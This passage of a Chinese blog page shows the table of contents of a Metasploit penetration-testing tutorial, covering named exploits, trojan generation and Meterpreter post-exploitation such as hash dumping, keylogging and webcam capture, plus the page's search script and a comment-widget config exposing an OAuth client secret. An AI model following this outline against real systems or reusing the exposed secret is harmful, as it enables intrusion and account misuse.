          1.2.3溢出代码(Shellcode)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-4%E6%A8%A1%E5%9D%97-Module"><span class="toc-number">1.2.4.</span> <span class="toc-text">
          1.2.4模块( Module)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-5%E7%9B%91%E5%90%AC%E5%99%A8-Listener"><span class="toc-number">1.2.5.</span> <span class="toc-text">
          1.2.5监听器(Listener)</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C-%E6%9B%B4%E6%96%B0MSF%E4%BB%A5%E5%8F%8A%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">2.</span> <span class="toc-text">
          二.更新MSF以及目录结构</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E5%A6%82%E4%BD%95%E6%9B%B4%E6%96%B0MSF"><span class="toc-number">2.1.</span> <span class="toc-text">
          2.1.如何更新MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-MSF%E7%9A%84%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84"><span class="toc-number">2.2.</span> <span class="toc-text">
          2.2.MSF的目录结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-Modules-%E6%A8%A1%E5%9D%97"><span class="toc-number">2.3.</span> <span class="toc-text">
          2.3.Modules(模块)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-1-Auxiliary"><span class="toc-number">2.3.1.</span> <span class="toc-text">
          2.3.1.Auxiliary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-2-Encoders"><span class="toc-number">2.3.2.</span> <span class="toc-text">
          2.3.2.Encoders</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-3-Exploits"><span class="toc-number">2.3.3.</span> <span class="toc-text">
          2.3.3.Exploits</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-4-Nops"><span class="toc-number">2.3.4.</span> <span class="toc-text">
          2.3.4.Nops</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-5-Payloads"><span class="toc-number">2.3.5.</span> <span class="toc-text">
          2.3.5.Payloads</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-6-Post"><span class="toc-number">2.3.6.</span> <span class="toc-text">
          2.3.6.Post</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-7-Data"><span class="toc-number">2.3.7.</span> <span class="toc-text">
          2.3.7.Data</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-8-Plugins"><span class="toc-number">2.3.8.</span> <span class="toc-text">
          2.3.8.Plugins</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-9-Scripts"><span class="toc-number">2.3.9.</span> <span class="toc-text">
          2.3.9.Scripts</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-10-TOOLS"><span class="toc-number">2.3.10.</span> <span class="toc-text">
          2.3.10.TOOLS</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89-MSF%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">3.</span> <span class="toc-text">
          三.MSF基本命令</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Msfconsole%E6%8E%A7%E5%88%B6%E5%8F%B0"><span class="toc-number">3.1.</span> <span class="toc-text">
          3.1.Msfconsole控制台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Msfconsole%E7%9A%84%E5%A5%BD%E5%A4%84"><span class="toc-number">3.2.</span> <span class="toc-text">
          3.2.Msfconsole的好处</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Msfconsole%E5%91%BD%E4%BB%A4"><span class="toc-number">3.3.</span> <span class="toc-text">
          3.3.Msfconsole命令</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B-Exploits-And-Payloads-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.</span> <span class="toc-text">
          四.Exploits And Payloads 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-Exploits-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.1.</span> <span class="toc-text">
          4.1.Exploits 模块</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-2-Payloads-%E6%A8%A1%E5%9D%97"><span class="toc-number">4.2.</span> <span class="toc-text">
          4.2.Payloads 模块</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%94-MSF%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E6%B5%8B%E8%AF%95"><span class="toc-number">5.</span> <span class="toc-text">
          五.MSF漏洞实例测试</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#5-1-%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%B8%97%E9%80%8F%EF%BC%88MS08-067"><span class="toc-number">5.1.</span> <span class="toc-text">
          5.1.网络服务器攻击渗透（MS08_067)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-2-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%94%BB%E5%87%BB%E6%B8%97%E9%80%8F%EF%BC%88MS10-018"><span class="toc-number">5.2.</span> <span class="toc-text">
          5.2.浏览器攻击渗透（MS10_018)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-3-%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%B8%97%E9%80%8F%EF%BC%8C%E5%88%A9%E7%94%A8word%E5%8E%BB%E6%B8%97%E9%80%8F%EF%BC%88MS10-087"><span class="toc-number">5.3.</span> <span class="toc-text">
          5.3.应用软件格式渗透，利用word去渗透（MS10_087)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-4-%E7%BD%91%E8%B7%AF%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%94%BB%E5%87%BB%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88MS17-010"><span class="toc-number">5.4.</span> <span class="toc-text">
          5.4.网路服务器攻击渗透测试（MS17_010)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-5-%E5%88%A9%E7%94%A8-samba-%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E%E5%85%A5%E4%BE%B5-Linux-%E4%B8%BB%E6%9C%BA%EF%BC%88CVE-2017-7494-%E4%B8%8E-samba-%E4%BD%8E%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%89"><span class="toc-number">5.5.</span> <span class="toc-text">
          5.5.利用 samba 服务漏洞入侵 Linux 主机（CVE-2017-7494 与 samba 低版本漏洞利用）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-6-Bash-Shellshock-CVE-2014-6271%EF%BC%88%E7%A0%B4%E5%A3%B3%EF%BC%89"><span class="toc-number">5.6.</span> <span class="toc-text">
          5.6.Bash Shellshock CVE_2014_6271（破壳）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-7-PHP-CGI-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.7.</span> <span class="toc-text">
          5.7.PHP CGI 漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-8-Java-RMI-SERVER-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E4%B8%8E-java-cve-2013-0422"><span class="toc-number">5.8.</span> <span class="toc-text">
          5.8.Java RMI SERVER 命令执行漏洞与 java cve_2013_0422</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-9-Distcc-%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.9.</span> <span class="toc-text">
          5.9. Distcc 后门漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-10-Druby-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.10.</span> <span class="toc-text">
          5.10.Druby 命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-11-CVE-2017-8464-%E9%9C%87%E7%BD%91%E4%B8%89%E4%BB%A3-%EF%BC%88%E8%BF%9C%E7%A8%8B%E5%BF%AB%E6%8D%B7%E6%96%B9%E5%BC%8F%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-number">5.11.</span> <span class="toc-text">
          5.11. CVE_2017_8464 震网三代 （远程快捷方式漏洞）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-12-flash-0day-CVE-2018-4878"><span class="toc-number">5.12.</span> <span class="toc-text">
          5.12. flash 0day (CVE-2018-4878)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-13-%E7%94%9F%E6%88%90-exe-%E7%9A%84%E6%9C%A8%E9%A9%AC%E6%96%87%E4%BB%B6"><span class="toc-number">5.13.</span> <span class="toc-text">
          5.13. 生成 exe 的木马文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5-14-%E6%B8%97%E9%80%8F-Android-%E7%B3%BB%E7%BB%9F"><span class="toc-number">5.14.</span> <span class="toc-text">
          5.14. 渗透 Android 系统</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-14-1-%E6%B8%97%E9%80%8F%E6%AD%A5%E9%AA%A4"><span class="toc-number">5.14.1.</span> <span class="toc-text">
          5.14.1. 渗透步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.14.1.1.</span> <span class="toc-text">
          1. 内网渗透</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">5.14.1.2.</span> <span class="toc-text">
          2. 外网渗透</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-14-2-%E5%90%8E%E6%9C%9F-%E5%A4%84%E7%90%86"><span class="toc-number">5.14.2.</span> <span class="toc-text">
          5.14.2. 后期 处理</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AD-%E6%8B%93%E5%B1%95%EF%BC%9AAuxiliary%EF%BC%88%E8%BE%85%E5%8A%A9%EF%BC%89%E6%A8%A1%E5%9D%97"><span class="toc-number">6.</span> <span class="toc-text">
          六.拓展：Auxiliary（辅助）模块</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%83-%E6%8B%93%E5%B1%95%EF%BC%9ANmap-%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-%E6%A8%A1%E5%9D%97"><span class="toc-number">7.</span> <span class="toc-text">
          七. 拓展：Nmap (端口扫描) 模块</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#7-1-Syn-%E6%89%AB%E6%8F%8F"><span class="toc-number">7.1.</span> <span class="toc-text">
          7.1 Syn 扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#7-2-Tcp-%E6%89%AB%E6%8F%8F"><span class="toc-number">7.2.</span> <span class="toc-text">
          7.2 Tcp 扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%AB-%E6%9C%8D%E5%8A%A1%E7%89%88%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%8E%A2%E7%B4%A2"><span class="toc-number">8.</span> <span class="toc-text">
          八. 服务版本信息探索</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#8-1-SMB-%E7%89%88%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">8.1.</span> <span class="toc-text">
          8.1. SMB 版本扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2-SSH-%E7%89%88%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">8.2.</span> <span class="toc-text">
          8.2. SSH 版本扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-3-FTP-%E7%89%88%E6%9C%AC%E6%89%AB%E6%8F%8F"><span class="toc-number">8.3.</span> <span class="toc-text">
          8.3. FTP 版本扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B9%9D-Meterpreter%E7%9A%84%E5%90%8E%E6%9C%9F%E6%94%BB%E5%87%BB%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95"><span class="toc-number">9.</span> <span class="toc-text">
          九.Meterpreter的后期攻击使用方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#9-1-%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E5%88%B0Windows%E4%B8%BB%E6%9C%BA"><span class="toc-number">9.1.</span> <span class="toc-text">
          9.1.上传文件到Windows主机</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-2-%E4%BB%8EWindows%E4%B8%BB%E6%9C%BA%E4%B8%8A%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-number">9.2.</span> <span class="toc-text">
          9.2.从Windows主机上下载文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-3-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%8A%E6%89%A7%E8%A1%8C-exe-%E6%96%87%E4%BB%B6"><span class="toc-number">9.3.</span> <span class="toc-text">
          9.3.在目标主机上执行 exe 文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-4-%E5%88%9B%E5%BB%BACMD%E6%96%B0%E9%80%9A%E9%81%93"><span class="toc-number">9.4.</span> <span class="toc-text">
          9.4.创建CMD新通道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-5-%E6%98%BE%E7%A4%BA%E8%BF%9B%E7%A8%8B"><span class="toc-number">9.5.</span> <span class="toc-text">
          9.5.显示进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-6-%E8%8E%B7%E5%8F%96admin%E6%9D%83%E9%99%90"><span class="toc-number">9.6.</span> <span class="toc-text">
          9.6.获取admin权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-7-%E4%BD%BF%E7%94%A8-Hashdump-%E8%BD%AC%E5%82%A8%E6%89%80%E6%9C%89-hash-%E5%80%BC"><span class="toc-number">9.7.</span> <span class="toc-text">
          9.7.使用 Hashdump 转储所有 hash 值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-8-%E4%BD%BF%E7%94%A8-Credcollect-%E8%BD%AC%E5%82%A8-hash-%E5%80%BC"><span class="toc-number">9.8.</span> <span class="toc-text">
          9.8.使用 Credcollect 转储 hash 值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-9-%E5%88%9B%E5%BB%BA%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">9.9.</span> <span class="toc-text">
          9.9.创建端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-10-%E5%88%A0%E9%99%A4%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91"><span class="toc-number">9.10.</span> <span class="toc-text">
          9.10.删除端口转发</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-11-%E5%9C%A8%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E4%B8%8A%E6%90%9C%E7%B4%A2%E6%96%87%E4%BB%B6"><span class="toc-number">9.11.</span> <span class="toc-text">
          9.11.在目标主机上搜索文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-12-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7-ID"><span class="toc-number">9.12.</span> <span class="toc-text">
          9.12.获取用户 ID</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-13-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF"><span class="toc-number">9.13.</span> <span class="toc-text">
          9.13.获取系统信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-14-%E6%A8%A1%E6%8B%9F%E4%BB%BB%E4%BD%95%E7%94%A8%E6%88%B7%EF%BC%88token-%E6%93%8D%E4%BD%9C%EF%BC%89"><span class="toc-number">9.14.</span> <span class="toc-text">
          9.14.模拟任何用户（token 操作）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-15-webcam-%E6%91%84%E5%83%8F%E5%A4%B4%E5%91%BD%E4%BB%A4"><span class="toc-number">9.15.</span> <span class="toc-text">
          9.15 webcam 摄像头命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-16-execute-%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6"><span class="toc-number">9.16.</span> <span class="toc-text">
          9.16. execute 执行文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-17-timestomp-%E4%BC%AA%E9%80%A0%E6%97%B6%E9%97%B4%E6%88%B3"><span class="toc-number">9.17.</span> <span class="toc-text">
          9.17. timestomp 伪造时间戳</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-18-%E6%9F%A5%E7%9C%8B%E7%9B%98%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6%E5%92%8C%E6%97%B6%E9%97%B4"><span class="toc-number">9.18.</span> <span class="toc-text">
          9.18. 查看盘的所有文件和时间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-19-enable-rdp-%E8%84%9A%E6%9C%AC%E5%BC%80%E5%90%AF3389%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%BF%9E%E6%8E%A5%EF%BC%89"><span class="toc-number">9.19.</span> <span class="toc-text">
          9.19. enable_rdp 脚本开启3389（远程桌面连接）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-20-%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%EF%BC%88%E8%BF%99%E4%B8%AA%E5%BE%97%E9%9D%A0%E8%BF%90%E6%B0%94%EF%BC%89"><span class="toc-number">9.20.</span> <span class="toc-text">
          9.20. 键盘记录（这个得靠运气）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-21-%E6%A1%8C%E9%9D%A2%E6%8A%93%E5%9B%BE"><span class="toc-number">9.21.</span> <span class="toc-text">
          9.21. 桌面抓图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#9-22-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%AF%86%E7%A0%81"><span class="toc-number">9.22.</span> <span class="toc-text">
          9.22. 获取系统管理密码</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/logo.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">Sculptor</p></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/Sculptor-liu/" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://blog.csdn.net/weixin_45798017" target="_blank" rel="noopener" data-popover="social.csdn" data-popover-pos="up"><span class="sidebar-ov-social-item__icon">csdn</span></a></div><div class="sidebar-ov-feed"><span class="sidebar-ov-feed-email"><a class="sidebar-ov-feed-email__link" href="https://mail.qq.com/" target="_blank" rel="noopener"><span class="sidebar-ov-feed-email__icon"><i class="fas fa-envelope"></i></span><span>Email 订阅</span></a></span></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">72</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">7</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">49</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-cn" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>Sculptor</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.1.1</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.1.1</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.xml';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-md5@latest/src/md5.min.js"></script><script>function loadGitalk () {
  if (!document.getElementById('gitalk-container')) {
    return;
  }

  var gitalk = new Gitalk({
    id: md5(window.location.pathname.slice(1)),
    clientID: '28f6b94423100cc8a01d',
    clientSecret: '812ec412a6abb31e41feedc3fa3ba97eefa1a882',
    repo: 'Sculptor-liu.github.io',
